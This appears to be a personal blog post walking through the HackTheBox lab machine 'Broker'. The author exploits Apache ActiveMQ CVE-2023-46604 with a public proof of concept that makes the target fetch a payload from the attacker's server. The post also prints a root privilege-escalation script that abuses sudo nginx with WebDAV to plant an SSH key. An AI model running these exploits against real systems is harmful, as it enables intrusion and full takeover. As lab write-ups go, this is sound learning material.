@@ -1,0 +1,526 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Broker - HackTheBox :: dwo.sh</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="
+" />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="/posts/broker---hackthebox/" />
+
+
+
+
+
+  
+  <link rel="stylesheet" href="/css/extended.min.9f2900d1abbf8230ea58db511e896e7c56cfd8580ba8ced694f185c3c7b61843.css">
+
+  
+  <link rel="stylesheet" href="/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">
+
+  
+  <link rel="stylesheet" href="/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css">
+
+  
+  <link rel="stylesheet" href="/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">
+
+  
+  <link rel="stylesheet" href="/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">
+
+  
+  <link rel="stylesheet" href="/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">
+
+  
+  <link rel="stylesheet" href="/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css">
+
+  
+  <link rel="stylesheet" href="/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">
+
+  
+  <link rel="stylesheet" href="/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">
+
+  
+  <link rel="stylesheet" href="/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">
+
+  
+  <link rel="stylesheet" href="/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css">
+
+  
+  <link rel="stylesheet" href="/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css">
+
+  
+  <link rel="stylesheet" href="/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+
+
+<link rel="stylesheet" href="/terminal.css">
+
+
+
+
+<link rel="shortcut icon" href="/favicon.png">
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Broker - HackTheBox">
+<meta property="og:description" content="
+" />
+<meta property="og:url" content="/posts/broker---hackthebox/" />
+<meta property="og:site_name" content="dwo.sh" />
+
+  <meta property="og:image" content="/og-image.png">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2026-01-12 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body>
+
+
+<div class="container center">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    dwo.sh
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/">home</a></li>
+        
+      
+        
+          <li><a href="/about">about</a></li>
+        
+      
+        
+          <li><a href="/whoami">whoami</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/" >home</a></li>
+        
+      
+        
+          <li><a href="/about" >about</a></li>
+        
+      
+        
+          <li><a href="/whoami" >whoami</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="/posts/broker---hackthebox/">Broker - HackTheBox</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2026-01-12</time></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="/tags/hackthebox/">hackthebox</a>&nbsp;
+      
+      #<a href="/tags/linux/">linux</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <p><img alt="Image Description" src="/images/Pasted%20image%2020260112112319.png"></p>
+<h2 id="enumeration">Enumeration<a href="#enumeration" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>Let&rsquo;s start with a simple port scan:</p>
+<pre tabindex="0"><code>nmap -sC -sV -v 10.129.230.87
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
+|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|_  basic realm=ActiveMQRealm
+|_http-title: Error 401 Unauthorized
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><p>I am looking for an ActiveMQ service, which wasn&rsquo;t revealed by this scan. Let&rsquo;s include more ports in a second scan:</p>
+<pre tabindex="0"><code>nmap -sC -sV -v 10.129.230.87 --top-ports 10000
+
+PORT      STATE SERVICE    VERSION
+22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
+|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
+80/tcp    open  http       nginx 1.18.0 (Ubuntu)
+|_http-title: Error 401 Unauthorized
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|_  basic realm=ActiveMQRealm
+1883/tcp  open  mqtt
+| mqtt-subscribe: 
+|   Topics and their most recent payloads: 
+|_    ActiveMQ/Advisory/Consumer/Topic/#: 
+5672/tcp  open  amqp?
+|_amqp-info: ERROR: AQMP:handshake expected header (1) frame, but was 65
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
+|     AMQP
+|     AMQP
+|     amqp:decode-error
+|_    7Connection from client using unsupported AMQP attempted
+8161/tcp  open  http       Jetty 9.4.39.v20210325
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|_  basic realm=ActiveMQRealm
+|_http-server-header: Jetty(9.4.39.v20210325)
+|_http-title: Error 401 Unauthorized
+39489/tcp open  tcpwrapped
+61613/tcp open  stomp      Apache ActiveMQ
+| fingerprint-strings: 
+|   HELP4STOMP: 
+|     ERROR
+|     content-type:text/plain
+|     message:Unknown STOMP action: HELP
+|     org.apache.activemq.transport.stomp.ProtocolException: Unknown STOMP action: HELP
+|     org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:258)
+|     org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:85)
+|     org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
+|     org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)
+|     org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)
+|_    java.lang.Thread.run(Thread.java:750)
+61616/tcp open  apachemq   ActiveMQ OpenWire transport
+| fingerprint-strings: 
+|   NULL: 
+|     ActiveMQ
+|     TcpNoDelayEnabled
+|     SizePrefixDisabled
+|     CacheSize
+|     ProviderName 
+|     ActiveMQ
+|     StackTraceEnabled
+|     PlatformDetails 
+|     Java
+|     CacheEnabled
+|     TightEncodingEnabled
+|     MaxFrameSize
+|     MaxInactivityDuration
+|     MaxInactivityDurationInitalDelay
+|     ProviderVersion 
+|_    5.15.15
+</code></pre><p>Ok, looks like it&rsquo;s running on 61616 and is version 5.15.15. Let&rsquo;s search for a CVE before we go any further.</p>
+<h2 id="research-on-cve">Research On CVE<a href="#research-on-cve" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>I found this from <a href="https://activemq.apache.org/news/cve-2023-46604">https://activemq.apache.org/news/cve-2023-46604</a>:</p>
+<blockquote>
+<p>The Java OpenWire protocol marshaller is vulnerable to Remote Code Execution. This vulnerability may allow a remote attacker with network access to either a Java-based OpenWire broker or client to run arbitrary shell commands by manipulating serialized class types in the OpenWire protocol to cause either the client or the broker (respectively) to instantiate any class on the classpath.</p>
+</blockquote>
+<h2 id="initial-foothold">Initial Foothold<a href="#initial-foothold" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>Let&rsquo;s look up some POC&rsquo;s in metasploit</p>
+<pre tabindex="0"><code>msf &gt; search &#34;cve-2023-46604&#34;
+
+Matching Modules
+================
+
+   #  Name                                                   Disclosure Date  Rank       Check  Description
+   -  ----                                                   ---------------  ----       -----  -----------
+   0  exploit/multi/misc/apache_activemq_rce_cve_2023_46604  2023-10-27       excellent  Yes    Apache ActiveMQ Unauthenticated Remote Code Execution
+   1    \_ target: Windows                                   .                .          .      .
+   2    \_ target: Linux                                     .                .          .      .
+   3    \_ target: Unix                                      .                . 
+</code></pre><p>Metasploit isn&rsquo;t working for me. I&rsquo;ll quickly try <a href="https://github.com/rootsecdev/CVE-2023-46604">this github repo</a> and see if we I can get RCE.</p>
+<p>Set up a server:</p>
+<pre tabindex="0"><code>python -m http.server 8080
+</code></pre><p>And run the script:</p>
+<pre tabindex="0"><code>david@red:~/Pentest/tools/CVE-2023-46604$ go run main.go -i 10.129.230.87 -p 61616 -u http://10.10.17.8:8080/poc-linux.xml
+     _        _   _           __  __  ___        ____   ____ _____ 
+    / \   ___| |_(_)_   _____|  \/  |/ _ \      |  _ \ / ___| ____|
+   / _ \ / __| __| \ \ / / _ \ |\/| | | | |_____| |_) | |   |  _|  
+  / ___ \ (__| |_| |\ V /  __/ |  | | |_| |_____|  _ &lt;| |___| |___ 
+ /_/   \_\___|\__|_| \_/ \___|_|  |_|\__\_\     |_| \_\\____|_____|
+
+[*] Target: 10.129.230.87:61616
+[*] XML URL: http://10.10.17.8:8080/poc-linux.xml
+
+[*] Sending packet: 000000771f000000000000000000010100426f72672e737072696e676672616d65776f726b2e636f6e746578742e737570706f72742e436c61737350617468586d6c4170706c69636174696f6e436f6e74657874010024687474703a2f2f31302e31302e31372e383a383038302f706f632d6c696e75782e786d6c
+</code></pre><p>I also needed to edit the xml file to include my ip address, plus start a netcat listener on 9001&hellip; and I&rsquo;m IN!</p>
+<h2 id="recon">Recon<a href="#recon" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>Let&rsquo;s upgrade the terminal&hellip; there&rsquo;s no python on the box, so we&rsquo;ll settle for this:</p>
+<p><code>script -q /dev/null /bin/bash</code></p>
+<p>Running some basic commands:</p>
+<pre tabindex="0"><code>activemq@broker:/opt/apache-activemq-5.15.15/bin$ id; whoami; pwd
+id; whoami; pwd
+uid=1000(activemq) gid=1000(activemq) groups=1000(activemq)
+activemq
+/opt/apache-activemq-5.15.15/bin
+activemq@broker:/opt/apache-activemq-5.15.15/bin$ sudo -l
+sudo -l
+Matching Defaults entries for activemq on broker:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User activemq may run the following commands on broker:
+    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
+activemq@broker:/opt/apache-activemq-5.15.15/bin$
+</code></pre><p>So we&rsquo;re in the bin directory. Also, we can run /usr/sbin/nginx as root! Useful for later. For now, I&rsquo;ll capture the user flag and see which direction the hints guide me in.</p>
+<pre tabindex="0"><code>cd /home
+activemq@broker:/home$ dir
+dir
+activemq
+activemq@broker:/home$ cd activemq
+cd activemq
+activemq@broker:~$ dir
+dir
+user.txt
+activemq@broker:~$ cat user.txt
+cat user.txt
+982d41ffdbb22dae7420ee5c58cf2a3a
+activemq@broker:~$ 
+</code></pre><h2 id="privesc">Privesc<a href="#privesc" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>Turns out my nose was in the right place - the next hint asks for a binary activemq can run as any other user with sudo (<code>/usr/sbin/nginx</code>).</p>
+<p>I&rsquo;m going to quickly search sites like GTFOBins for nginx.</p>
+<p>Can we just use this? <a href="https://github.com/DylanGrl/nginx_sudo_privesc">https://github.com/DylanGrl/nginx_sudo_privesc</a></p>
+<p>Yes, it&rsquo;s that simple. I&rsquo;m going to try and understand it - it leverages webdav&hellip;</p>
+<p>Analysing the script - we run nginx as root, use that to add an SSH key to the root user, then simply run SSH with our added key. I&rsquo;ll need to tweak this slightly for the current environment:</p>
+<pre tabindex="0"><code>#!/bin/sh
+echo &#34;[+] Creating configuration...&#34;
+cat &lt;&lt; EOF &gt; /tmp/nginx_pwn.conf
+user root;
+worker_processes 4;
+pid /tmp/nginx.pid;
+events {
+        worker_connections 768;
+}
+http {
+	server {
+	        listen 1339;
+	        root /;
+	        autoindex on;
+	        dav_methods PUT;
+	}
+}
+EOF
+echo &#34;[+] Loading configuration...&#34;
+sudo nginx -c /tmp/nginx_pwn.conf
+echo &#34;[+] Generating SSH Key...&#34;
+ssh-keygen
+echo &#34;[+] Display SSH Private Key for copy...&#34;
+cat .ssh/id_rsa
+echo &#34;[+] Add key to root user...&#34;
+curl -X PUT localhost:1339/root/.ssh/authorized_keys -d &#34;$(cat .ssh/id_rsa.pub)&#34;
+echo &#34;[+] Use the SSH key to get access&#34;
+</code></pre><p>Let&rsquo;s do it manually. First, I&rsquo;ll create the config file on the server.</p>
+<p>Next, running the server, I see this error:</p>
+<pre tabindex="0"><code>sudo nginx -c /tmp/nginx_pwn.conf
+nginx: [emerg] bind() to 0.0.0.0:1339 failed (98: Unknown error)
+nginx: [emerg] bind() to 0.0.0.0:1339 failed (98: Unknown error)
+nginx: [emerg] bind() to 0.0.0.0:1339 failed (98: Unknown error)
+nginx: [emerg] bind() to 0.0.0.0:1339 failed (98: Unknown error)
+nginx: [emerg] bind() to 0.0.0.0:1339 failed (98: Unknown error)
+nginx: [emerg] still could not bind()
+activemq@broker:/tmp$ 
+</code></pre><p>Hmm, let&rsquo;s ChatGPT the issue. Maybe nginx is already running? Maybe I need to specify a different ip address?</p>
+<blockquote>
+<p>That error means <strong>nginx cannot bind to port <code>1339</code> because the port is already in use (or otherwise unavailable)</strong>.</p>
+</blockquote>
+<p>I retried on port 5566&hellip; this ran with no message the first time, then gave back an error the second time. This SUGGESTS that the process is already running. I should have run a process check.</p>
+<p>I can do better than that! Let&rsquo;s use <code>netstat</code> to confirm my hypothesis:</p>
+<pre tabindex="0"><code>activemq@broker:~/.ssh$ netstat -tuln
+netstat -tuln
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:5566            0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:1339            0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
+tcp6       0      0 :::5672                 :::*                    LISTEN     
+tcp6       0      0 :::8161                 :::*                    LISTEN     
+tcp6       0      0 :::1883                 :::*                    LISTEN     
+tcp6       0      0 :::39489                :::*                    LISTEN     
+tcp6       0      0 :::61616                :::*                    LISTEN     
+tcp6       0      0 :::61613                :::*                    LISTEN     
+tcp6       0      0 :::61614                :::*                    LISTEN     
+tcp6       0      0 :::22                   :::*                    LISTEN     
+udp        0      0 127.0.0.53:53           0.0.0.0:*                          
+udp        0      0 0.0.0.0:68              0.0.0.0:*                          
+activemq@broker:~/.ssh$ 
+</code></pre><p>I see stuff running on those ports. Good enough for me. I proceeded with the other exploit commands&hellip; now we&rsquo;ll store the generated ssh key and use it to connect to our host.</p>
+<pre tabindex="0"><code>chmod 600 root_key
+ssh -i root_key root@10.129.230.87
+</code></pre><p>I GOT IT! I am now in&hellip; but NOT without tribulation. I tried to use ssh as activemq on the broker machine, and it didn&rsquo;t work. It worked when I copied it to my local machine and used it. Why?</p>
+<p>Ahh&hellip; I could have used <code>ssh root@localhost</code>, silly me. Nonetheless, we got there!</p>
+<pre tabindex="0"><code>david@red:~/Downloads$ ssh -i root_key root@10.129.230.87
+Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Mon Jan 12 12:41:04 PM UTC 2026
+
+  System load:           0.0
+  Usage of /:            70.8% of 4.63GB
+  Memory usage:          12%
+  Swap usage:            0%
+  Processes:             169
+  Users logged in:       0
+  IPv4 address for eth0: 10.129.230.87
+  IPv6 address for eth0: dead:beef::250:56ff:fe94:2d6b
+
+ * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+   just raised the bar for easy, resilient and secure K8s cluster deployment.
+
+   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+root@broker:~# ls
+cleanup.sh  root.txt
+root@broker:~# cat root.txt
+e2855ba2ff137a93257a15d3a40b1621
+root@broker:~# 
+</code></pre><h2 id="reflection">Reflection<a href="#reflection" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>Using this blog makes me better at thinking things through&hellip; I will continue to do so</li>
+<li>I liked how I decided to use the privilege escalation Github repo step-by-step</li>
+<li>I could have privesced way quicker by remembering to ssh to localhost!</li>
+</ul>
+      </div></div>
+
+  
+    
+<div class="pagination">
+  <div class="pagination__title">
+    <span class="pagination__title-h">Read other posts</span>
+    <hr />
+  </div>
+  <div class="pagination__buttons">
+    
+      <a href="/posts/blocky---hackthebox/" class="button inline prev">
+        &lt; [<span class="button__text">Blocky - HackTheBox</span>]
+      </a>
+    
+    
+    
+  </div>
+</div>
+
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">
+        <span>© David Willis-Owen</span>
+    
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
